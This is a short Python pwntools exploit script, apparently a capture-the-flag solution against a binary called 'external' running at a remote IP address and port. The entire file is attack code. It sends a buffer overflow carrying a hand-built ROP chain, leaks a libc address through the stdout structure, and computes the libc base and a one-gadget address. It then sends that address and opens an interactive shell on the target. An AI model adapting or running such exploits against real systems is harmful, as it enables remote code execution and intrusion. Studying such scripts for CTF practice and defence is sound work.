#!/usr/bin/env python

from pwn import *

#p = process("./external")
p = remote("161.97.176.150", 9999)
binf = ELF("./external")
libc = ELF("./libc-2.28.so")
context.log_level = "DEBUG"

pause()

payload = "A"*0x50
payload += p64(1)
payload += p64(0x004012f3)
payload += p64(0)
payload += p64(0x004012f1)
payload += p64(0x0000000000404080)
payload += p64(0)
payload += p64(0x0000000000401283)

payload += p64(0x004012f3)
payload += p64(1)
payload += p64(0x004012f1)
payload += p64(0x0000000000404040)
payload += p64(0)
payload += p64(0x000000000040127C)

payload += p64(0x004011a4)
payload += p64(0x0000000000404080-8)
payload += p64(0x00401269)

p.sendafter("ROP me ;)\n", payload)

payload = p64(0x004012f3)
payload += p64(0)
payload += p64(0x0000000000401283)
payload += p64(binf.plt['read'])

p.send(payload)

leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
base = leak - libc.symbols['_IO_2_1_stdout_']
one = base + 0x448a3
success(hex(leak))
success(hex(base)) 
p.send(p64(one))

p.interactive()
